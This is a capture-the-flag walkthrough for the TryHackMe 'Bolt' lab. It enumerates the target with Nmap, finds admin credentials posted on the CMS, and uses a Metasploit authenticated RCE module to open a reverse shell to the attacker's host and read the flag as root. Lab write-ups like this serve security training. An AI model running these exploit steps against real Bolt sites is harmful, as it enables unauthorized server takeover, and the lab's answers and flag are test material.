# Bolt

A hero is unleashed.

This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution. You should wait for at least 3-4 minutes for the machine to start properly.

If you have any queries or feedback you can reach me through the TryHackMe Discord server or through Twitter.

# #1

**What port number has a web server with a CMS running?**

Let's start by enumerating the services running on the machine with Nmap:

~~~
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    (PHP 7.2.32-1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Sat, 22 Aug 2020 06:41:24 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: private, must-revalidate
|     Date: Sat, 22 Aug 2020 06:41:24 GMT
|     Content-Type: text/html; charset=UTF-8
|     pragma: no-cache
|     expires: -1
|     X-Debug-Token: 4a1f52
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     </head>
|     <body>
|     href="#main-content" class="vis
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Date: Sat, 22 Aug 2020 06:41:23 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
|     Cache-Control: public, s-maxage=600
|     Date: Sat, 22 Aug 2020 06:41:23 GMT
|     Content-Type: text/html; charset=UTF-8
|     X-Debug-Token: e86e48
|     <!doctype html>
|     <html lang="en-GB">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Bolt | A hero is unleashed</title>
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">
|     <meta name="generator" content="Bolt">
|     <link rel="canonical" href="http://0.0.0.0:8000/">
|     </head>
|_    <body class="front">
|_http-generator: Bolt
|_http-title: Bolt | A hero is unleashed

[REDACTED]

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Nmap reveals 3 open ports, and Bolt is running on the highest port: `8000`.

# #2

**What is the username we can find in the CMS?**

Browsing the CMS on port 8000 reveals a message from Jake (Admin) that discloses his username: `bolt`:

~~~
Hello Everyone,

Welcome to this site, myself Jake and my username is bolt .I am still new to this CMS so it can take awhile for me to get used to this CMS but believe me i have some great content coming up for you all!

Regards,

Jake (Admin)
~~~

Answer: `bolt`

# #3

**What is the password we can find for the username?**

In another post, the password is also revealed:

~~~
Message for IT Department

Hey guys,

i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!

Regards,

Jake (Admin)
~~~

Answer: `boltadmin123`

# #4

**What version of the CMS is installed on the server? (Ex: Name 1.1.1)**

Let's authenticate against the admin interface (http://10.10.177.138:8000/bolt/login) with the credentials gathered previously.

The version is disclosed in the bottom left corner.

Answer: `bolt 3.7.1`.

# #5

**There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?**

Using `searchsploit`, we can find an "Authenticated Remote Code Execution" exploit affecting version 3.7.0 (EDB-ID 48296):

~~~
unknown@kali:/data/Bolt$ searchsploit bolt
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apple WebKit - 'JSC::SymbolTableEntry::isWatchable' Heap Buffer Overflow           | multiple/dos/41869.html
Bolt CMS 3.6.10 - Cross-Site Request Forgery                                       | php/webapps/47501.txt
Bolt CMS 3.6.4 - Cross-Site Scripting                                              | php/webapps/46495.txt
Bolt CMS 3.6.6 - Cross-Site Request Forgery / Remote Code Execution                | php/webapps/46664.html
Bolt CMS 3.7.0 - Authenticated Remote Code Execution                               | php/webapps/48296.py
Bolt CMS < 3.6.2 - Cross-Site Scripting                                            | php/webapps/46014.txt
Bolthole Filter 2.6.1 - Address Parsing Buffer Overflow                            | multiple/remote/24982.txt
BoltWire 3.4.16 - 'index.php' Multiple Cross-Site Scripting Vulnerabilities        | php/webapps/36552.txt
BoltWire 6.03 - Local File Inclusion                                               | php/webapps/48411.txt
Cannonbolt Portfolio Manager 1.0 - Multiple Vulnerabilities                        | php/webapps/21132.txt
CMS Bolt - Arbitrary File Upload (Metasploit)                                      | php/remote/38196.rb
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

Answer: `48296`

# #6

**Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)**
**Note: If you can't find the exploit module its most likely because your metasploit isn't updated. Run `apt update` then `apt install metasploit-framework`**

Answer: `exploit/unix/webapp/bolt_authenticated_rce`

# #7

**Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit**

~~~
$ msfconsole -q
msf> use exploit/unix/webapp/bolt_authenticated_rce
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set rhost 10.10.13.119 
rhost => 10.10.13.119
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set username bolt
username => bolt
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set password boltadmin123
password => boltadmin123
msf5 exploit(unix/webapp/bolt_authenticated_rce) > set lhost 10.8.50.72
lhost => 10.8.50.72
msf5 exploit(unix/webapp/bolt_authenticated_rce) > exploit 

[*] Started reverse TCP handler on 10.8.50.72:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "mpizfg".
[*] Found 2 potential token(s) for creating .php files.
[+] Deleted file voagtvfn.php.
[+] Used token ea38f97e6971032c9ecad6346a to create xfdhvqmbfjo.php.
[*] Attempting to execute the payload via "/files/xfdhvqmbfjo.php?mpizfg=`payload`"
[*] Command shell session 1 opened (10.8.50.72:4444 -> 10.10.13.119:43148) at 2020-08-22 22:45:11 +0200
[!] No response, may have executed a blocking payload!
[+] Deleted file xfdhvqmbfjo.php.
[+] Reverted user profile back to original state.
~~~

# #8

**Look for flag.txt inside the machine.**

~~~
SHELL=/bin/bash script -q /dev/null
root@bolt:~/public/files# whoami
whoami
root
root@bolt:~/public/files# cd /home
cd /home
root@bolt:/home# ls -la
ls -la
total 288
drwxr-xr-x  3 root root   4096 Jul 18 19:36 .
drwxr-xr-x 27 root root   4096 Jul 18 19:30 ..
drwxr-xr-x 10 bolt bolt   4096 Jul 18 20:51 bolt
-rw-r--r--  1 root root 277509 Jul 18 19:36 composer-setup.php
-rw-r--r--  1 root root     34 Jul 18 19:33 flag.txt
root@bolt:/home# cat flag.txt	
cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
~~~

Answer: `THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}`
